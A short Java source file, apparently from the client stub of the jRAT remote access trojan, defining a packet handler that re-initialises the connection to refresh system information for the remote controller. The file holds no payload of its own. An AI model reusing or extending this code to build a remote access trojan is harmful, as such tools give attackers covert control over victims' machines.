package su.jrat.stub.packets.incoming;

import su.jrat.stub.Connection;

public class Packet27RefreshSystemInfo extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		Connection.initialize();
	}

}
